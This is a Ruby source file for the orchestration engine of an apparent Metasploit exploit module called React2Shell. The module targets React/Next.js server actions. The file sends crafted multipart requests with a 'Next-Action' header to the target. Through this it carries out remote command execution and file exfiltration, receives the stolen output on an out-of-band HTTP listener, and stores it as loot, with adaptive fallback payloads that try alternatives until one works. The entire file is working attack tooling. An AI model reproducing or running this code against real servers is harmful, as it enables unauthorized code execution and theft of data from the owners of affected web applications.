# frozen_string_literal: true

require_relative 'payload_generator'
require_relative 'oob_listener'
require_relative 'configuration_manager'
require_relative 'error_handler'

# Rex and Msf modules are required for Metasploit framework integration
begin
  require 'rex'
  require 'msf/core'
rescue LoadError
  # Fallback for testing environment without full Metasploit framework
  module Rex
    module Text
      def self.rand_text_alphanumeric(length)
        chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
        Array.new(length) { chars.sample }.join
      end
    end
  end
  
  module Msf
    module Exploit
      class CheckCode
        attr_reader :code, :message, :reason
        
        def initialize(code, message = nil, reason = nil)
          @code = code
          @message = message
          @reason = reason
        end
        
        def self.Vulnerable(message = nil, reason = nil)
          new(:vulnerable, message, reason)
        end
        
        def self.Safe(message = nil, reason = nil)
          new(:safe, message, reason)
        end
        
        def self.Appears(message = nil, reason = nil)
          new(:appears, message, reason)
        end
        
        def self.Unknown(message = nil, reason = nil)
          new(:unknown, message, reason)
        end
        
        def to_s
          "#{@code}: #{@message}"
        end
      end
    end
  end
end

module React2Shell
  ##
  # ExploitEngine - Main orchestration component for React2Shell exploitation
  # Coordinates PayloadGenerator and OOBListener to execute the exploit
  class ExploitEngine
    attr_reader :config_manager, :payload_generator, :oob_listener, :error_handler

    def initialize(msf_module)
      @msf_module = msf_module
      @config_manager = ConfigurationManager.new(msf_module)
      @payload_generator = PayloadGenerator.new(msf_module)
      @oob_listener = OOBListener.new(msf_module)
      @error_handler = ErrorHandler.new(msf_module)
    end

    ##
    # Performs vulnerability check using non-destructive payload
    # @return [Msf::Exploit::CheckCode] Result of vulnerability check
    def check_vulnerability
      @msf_module.print_status("Checking if target is vulnerable...")
      
      # Non-destructive test payload
      test_payload = "throw Object.assign(new Error('NEXT_REDIRECT'),{ digest:'REACT2SHELL_TEST' });"
      
      response = send_exploit_request(test_payload)
      
      return Msf::Exploit::CheckCode::Unknown("No response received from target") unless response
      
      case response.code
      when 200
        if response.body.include?('REACT2SHELL_TEST')
          Msf::Exploit::CheckCode::Vulnerable("Target responded with test digest")
        else
          Msf::Exploit::CheckCode::Unknown("Unexpected response content")
        end
      when 500
        if response.body.include?('digest')
          Msf::Exploit::CheckCode::Appears("Target appears vulnerable but test didn't execute as expected")
        else
          Msf::Exploit::CheckCode::Unknown("Server error without expected content")
        end
      when 400, 404
        Msf::Exploit::CheckCode::Safe("Target rejected the request")
      else
        @msf_module.vprint_status("Response code: #{response.code}")
        @msf_module.vprint_status("Response body: #{response.body[0..500]}") if response.body
        Msf::Exploit::CheckCode::Unknown("Unexpected response")
      end
    end

    ##
    # Executes the main exploit based on configuration
    # @param mode [Symbol] :file_exfiltration or :command_execution
    # @param options [Hash] Additional options for evasion and adaptation
    def execute_exploit(mode, options = {})
      begin
        case mode
        when :file_exfiltration
          execute_file_exfiltration(options)
        when :command_execution
          execute_command_execution(options)
        else
          raise ArgumentError, "Invalid exploit mode: #{mode}"
        end
      rescue => e
        @error_handler.handle_payload_error(e, mode, { mode: mode, options: options })
        raise e
      end
    end

    ##
    # Executes exploit with adaptive payload selection and automatic fallback
    # @param mode [Symbol] :file_exfiltration or :command_execution
    # @param options [Hash] Options for adaptation and evasion
    def execute_adaptive_exploit(mode, options = {})
      begin
        # Enable alternatives by default for adaptive mode
        options[:try_alternatives] = true unless options.key?(:try_alternatives)
        
        case mode
        when :file_exfiltration
          execute_adaptive_file_exfiltration(options)
        when :command_execution
          execute_adaptive_command_execution(options)
        else
          raise ArgumentError, "Invalid exploit mode: #{mode}"
        end
      rescue => e
        @error_handler.handle_payload_error(e, :adaptive_exploit, { mode: mode, options: options })
        raise e
      end
    end

    ##
    # Executes multiple commands concurrently using separate OOB sessions
    # @param commands [Array<String>] Array of commands to execute
    # @return [Hash] Results keyed by command with session data
    def execute_multiple_commands(commands)
      return {} if commands.empty?
      
      target_host = @msf_module.datastore['RHOSTS'] || @msf_module.rhost
      oob_url = @config_manager.get_oob_url
      
      # Start OOB listener
      @oob_listener.start_server
      @msf_module.print_status("Started HTTP listener on #{@config_manager.get_listener_address}")
      
      results = {}
      sessions = []
      
      begin
        # Create sessions and send payloads for each command
        commands.each_with_index do |command, index|
          session = @oob_listener.create_session(target_host, :command, command)
          sessions << session
          
          @msf_module.print_status("Created session #{session.session_id} for command #{index + 1}: #{command}")
          
          # Generate and send command execution payload
          payload = @payload_generator.create_command_execution_payload(command, oob_url)
          @msf_module.print_status("Sending exploit for command #{index + 1}: #{command}")
          
          response = send_exploit_request(payload)
          handle_response(response)
          
          # Small delay between requests to avoid overwhelming the target
          sleep(0.5) if index < commands.length - 1
        end
        
        # Wait for all sessions to complete
        @msf_module.print_status("Waiting for #{sessions.length} command sessions to complete...")
        
        timeout = @config_manager.get_http_delay
        start_time = Time.now
        
        while (Time.now - start_time) < timeout && sessions.any? { |s| s.is_active? }
          sessions.each do |session|
            next unless session.is_complete?
            next if results.key?(session.source_info) # Already processed
            
            data = session.get_all_data
            results[session.source_info] = {
              session_id: session.session_id,
              data: data,
              summary: session.get_session_summary
            }
            
            @msf_module.print_good("Command '#{session.source_info}' completed (session #{session.session_id})")
            @msf_module.print_line("Output: #{data}")
            
            # Store as loot
            loot_path = @msf_module.store_loot(
              "react2shell.oob.command",
              'text/plain',
              @msf_module.rhost,
              data,
              session.source_info,
              "Command output via React2Shell: #{session.source_info}"
            )
            
            @msf_module.print_good("Data saved to: #{loot_path}")
          end
          
          sleep(1)
        end
        
        # Clean up timed out sessions
        timed_out = @oob_listener.cleanup_timed_out_sessions(timeout)
        if timed_out > 0
          @msf_module.print_warning("#{timed_out} sessions timed out")
        end
        
        # Report final statistics
        stats = @oob_listener.get_session_statistics
        @msf_module.print_status("Session statistics: #{stats[:completed_sessions]} completed, #{stats[:active_sessions]} active")
        
        results
        
      ensure
        @oob_listener.stop_server
      end
    end

    ##
    # Processes HTTP response from target server
    # @param response [Rex::Proto::Http::Response] HTTP response object
    # @return [Hash] Processed response information
    def handle_response(response)
      result = {
        success: false,
        code: response&.code,
        message: nil,
        timestamp: Time.now
      }

      if response.nil?
        result[:message] = "No response received from target"
        @msf_module.print_warning(result[:message])
      else
        result[:success] = response.code == 200
        result[:message] = "Server responded with code: #{response.code}"
        @msf_module.print_status(result[:message])
      end

      result
    end

    private

    def execute_file_exfiltration(options = {})
      filepath = @config_manager.get_filepath
      oob_url = @config_manager.get_oob_url
      target_host = @msf_module.datastore['RHOSTS'] || @msf_module.rhost
      
      # Start OOB listener
      @oob_listener.start_server
      @msf_module.print_status("Started HTTP listener on #{@config_manager.get_listener_address}")
      
      # Create session for this file exfiltration
      session = @oob_listener.create_session(target_host, :file, filepath)
      @msf_module.print_status("Created session #{session.session_id} for file exfiltration: #{filepath}")
      
      # Generate and send file exfiltration payload
      if options[:try_alternatives]
        payload = @payload_generator.create_adaptive_file_payload(filepath, oob_url, options)
      else
        payload = @payload_generator.create_file_exfiltration_payload(filepath, oob_url)
      end
      
      @msf_module.print_status("Sending exploit to exfiltrate: #{filepath}")
      
      response = send_exploit_request(payload)
      handle_response(response)
      
      # Wait for OOB callback using session management
      wait_for_session_data(session, 'file', filepath)
    ensure
      @oob_listener.stop_server
    end

    def execute_command_execution(options = {})
      command = @config_manager.get_command
      oob_url = @config_manager.get_oob_url
      target_host = @msf_module.datastore['RHOSTS'] || @msf_module.rhost
      
      # Start OOB listener
      @oob_listener.start_server
      @msf_module.print_status("Started HTTP listener on #{@config_manager.get_listener_address}")
      
      # Create session for this command execution
      session = @oob_listener.create_session(target_host, :command, command)
      @msf_module.print_status("Created session #{session.session_id} for command execution: #{command}")
      
      # Generate and send command execution payload
      if options[:try_alternatives]
        payload = @payload_generator.create_adaptive_command_payload(command, oob_url, options)
      else
        payload = @payload_generator.create_command_execution_payload(command, oob_url)
      end
      
      @msf_module.print_status("Sending exploit to execute command: #{command}")
      
      response = send_exploit_request(payload)
      handle_response(response)
      
      # Wait for OOB callback using session management
      wait_for_session_data(session, 'command', command)
    ensure
      @oob_listener.stop_server
    end

    def execute_adaptive_file_exfiltration(options = {})
      filepath = @config_manager.get_filepath
      oob_url = @config_manager.get_oob_url
      target_host = @msf_module.datastore['RHOSTS'] || @msf_module.rhost
      
      # Start OOB listener
      @oob_listener.start_server
      @msf_module.print_status("Started HTTP listener on #{@config_manager.get_listener_address}")
      
      # Create session for this file exfiltration
      session = @oob_listener.create_session(target_host, :file, filepath)
      @msf_module.print_status("Created session #{session.session_id} for adaptive file exfiltration: #{filepath}")
      
      # Get all alternative payloads
      payloads = @payload_generator.create_adaptive_file_exfiltration_payload(filepath, oob_url, options)
      
      @msf_module.print_status("Trying #{payloads.length} alternative payload methods...")
      
      # Try each payload until one succeeds
      success = false
      payloads.each_with_index do |payload, index|
        @msf_module.print_status("Attempting method #{index + 1}/#{payloads.length}")
        @msf_module.vprint_status("Payload: #{payload}")
        
        response = send_exploit_request(payload)
        result = handle_response(response)
        
        if result[:success]
          @msf_module.print_good("Method #{index + 1} succeeded!")
          success = true
          break
        else
          @msf_module.print_warning("Method #{index + 1} failed, trying next...")
          sleep(1) # Brief delay between attempts
        end
      end
      
      unless success
        @msf_module.print_error("All payload methods failed")
        return false
      end
      
      # Wait for OOB callback using session management
      wait_for_session_data(session, 'file', filepath)
    ensure
      @oob_listener.stop_server
    end

    def execute_adaptive_command_execution(options = {})
      command = @config_manager.get_command
      oob_url = @config_manager.get_oob_url
      target_host = @msf_module.datastore['RHOSTS'] || @msf_module.rhost
      
      # Start OOB listener
      @oob_listener.start_server
      @msf_module.print_status("Started HTTP listener on #{@config_manager.get_listener_address}")
      
      # Create session for this command execution
      session = @oob_listener.create_session(target_host, :command, command)
      @msf_module.print_status("Created session #{session.session_id} for adaptive command execution: #{command}")
      
      # Get all alternative payloads
      payloads = @payload_generator.create_adaptive_command_execution_payload(command, oob_url, options)
      
      @msf_module.print_status("Trying #{payloads.length} alternative payload methods...")
      
      # Try each payload until one succeeds
      success = false
      payloads.each_with_index do |payload, index|
        @msf_module.print_status("Attempting method #{index + 1}/#{payloads.length}")
        @msf_module.vprint_status("Payload: #{payload}")
        
        response = send_exploit_request(payload)
        result = handle_response(response)
        
        if result[:success]
          @msf_module.print_good("Method #{index + 1} succeeded!")
          success = true
          break
        else
          @msf_module.print_warning("Method #{index + 1} failed, trying next...")
          sleep(1) # Brief delay between attempts
        end
      end
      
      unless success
        @msf_module.print_error("All payload methods failed")
        return false
      end
      
      # Wait for OOB callback using session management
      wait_for_session_data(session, 'command', command)
    ensure
      @oob_listener.stop_server
    end

    def send_exploit_request(payload_js)
      flight_chunk = @payload_generator.generate_flight_chunk(payload_js)
      
      # Create multipart form data
      boundary = "----WebKitFormBoundary#{Rex::Text.rand_text_alphanumeric(16)}"
      
      data = "--#{boundary}\r\n"
      data += "Content-Disposition: form-data; name=\"0\"\r\n"
      data += "\r\n"
      data += "#{flight_chunk}\r\n"
      
      data += "--#{boundary}\r\n"
      data += "Content-Disposition: form-data; name=\"1\"\r\n"
      data += "\r\n"
      data += '"$@0"' + "\r\n"
      data += "--#{boundary}--\r\n"
      
      headers = {
        'Next-Action' => 'x',
        'Content-Type' => "multipart/form-data; boundary=#{boundary}"
      }
      
      @msf_module.vprint_status("Sending multipart request with boundary: #{boundary}")
      @msf_module.vprint_status("Flight chunk: #{flight_chunk}")
      
      @msf_module.send_request_cgi({
        'method'  => 'POST',
        'uri'     => @msf_module.normalize_uri(@msf_module.target_uri.path),
        'data'    => data,
        'headers' => headers
      })
    end

    def wait_for_session_data(session, data_type, source_info)
      timeout = @config_manager.get_http_delay
      @msf_module.print_status("Waiting up to #{timeout} seconds for OOB callback (session #{session.session_id})...")
      
      start_time = Time.now
      while (Time.now - start_time) < timeout
        # Check if the specific session has completed
        if session.is_complete?
          data = session.get_all_data
          @msf_module.print_good("Received #{data_type} data via OOB (session #{session.session_id}):")
          @msf_module.print_line(data)
          
          # Store as loot
          loot_path = @msf_module.store_loot(
            "react2shell.oob.#{data_type}",
            'text/plain',
            @msf_module.rhost,
            data,
            source_info,
            "#{data_type.capitalize} data via React2Shell: #{source_info}"
          )
          
          @msf_module.print_good("Data saved to: #{loot_path}")
          
          # Print session summary
          summary = session.get_session_summary
          @msf_module.print_status("Session completed: #{summary[:data_entries]} entries, #{summary[:total_bytes]} bytes")
          
          return true
        end
        
        # Check for session timeout or error
        if session.is_timeout?(timeout)
          @error_handler.handle_timeout_error(
            "OOB callback wait",
            timeout,
            { 
              session_id: session.session_id,
              data_type: data_type,
              source_info: source_info
            }
          )
          break
        end
        
        sleep(1)
      end
      
      # Handle timeout with structured error handling
      @error_handler.handle_timeout_error(
        "OOB callback reception",
        timeout,
        { 
          session_id: session.session_id,
          data_type: data_type,
          source_info: source_info,
          elapsed_time: Time.now - start_time
        }
      )
      
      false
    end

    # Legacy method for backward compatibility
    def wait_for_oob_data(data_type, source_info)
      timeout = @config_manager.get_http_delay
      @msf_module.print_status("Waiting up to #{timeout} seconds for OOB callback...")
      
      start_time = Time.now
      while (Time.now - start_time) < timeout
        if @oob_listener.has_received_data?
          data = @oob_listener.get_received_data
          @msf_module.print_good("Received #{data_type} data via OOB:")
          @msf_module.print_line(data)
          
          # Store as loot
          loot_path = @msf_module.store_loot(
            "react2shell.oob.#{data_type}",
            'text/plain',
            @msf_module.rhost,
            data,
            source_info,
            "#{data_type.capitalize} data via React2Shell: #{source_info}"
          )
          
          @msf_module.print_good("Data saved to: #{loot_path}")
          return true
        end
        
        sleep(1)
      end
      
      @msf_module.print_warning("No OOB callback received within timeout")
      false
    end

    ##
    # Gets comprehensive error statistics from all components
    # @return [Hash] Combined error statistics
    def get_comprehensive_error_statistics
      {
        exploit_engine: @error_handler.get_error_statistics,
        configuration_manager: @config_manager.error_handler.get_error_statistics,
        oob_listener: @oob_listener.error_handler.get_error_statistics,
        session_manager: @oob_listener.session_manager.get_error_statistics,
        payload_generator: @payload_generator.error_handler&.get_error_statistics || { total_errors: 0 }
      }
    end

    ##
    # Exports comprehensive error log from all components
    # @param format [Symbol] Export format (:json, :text)
    # @return [String] Combined error log
    def export_comprehensive_error_log(format = :text)
      logs = {
        exploit_engine: @error_handler.export_error_log(format),
        configuration_manager: @config_manager.error_handler.export_error_log(format),
        oob_listener: @oob_listener.error_handler.export_error_log(format),
        session_manager: @oob_listener.session_manager.export_error_log(format)
      }

      if format == :json
        require 'json'
        logs.to_json
      else
        output = []
        output << "React2Shell Comprehensive Error Log"
        output << "=" * 60
        output << ""

        logs.each do |component, log|
          next if log.nil? || log.empty?
          output << "#{component.to_s.upcase.gsub('_', ' ')} ERRORS:"
          output << "-" * 40
          output << log
          output << ""
        end

        output.join("\n")
      end
    end

    ##
    # Displays error summary to user for debugging
    def display_error_summary
      stats = get_comprehensive_error_statistics
      total_errors = stats.values.sum { |s| s[:total_errors] || 0 }

      if total_errors > 0
        @msf_module.print_status("Error Summary: #{total_errors} total errors occurred")
        
        stats.each do |component, component_stats|
          next if component_stats[:total_errors] == 0
          
          @msf_module.print_status("  #{component}: #{component_stats[:total_errors]} errors")
          
          if component_stats[:by_category]
            component_stats[:by_category].each do |category, count|
              @msf_module.print_status("    #{category}: #{count}")
            end
          end
        end
        
        @msf_module.print_status("Use verbose mode for detailed error information")
      else
        @msf_module.print_good("No errors occurred during execution")
      end
    end
  end
end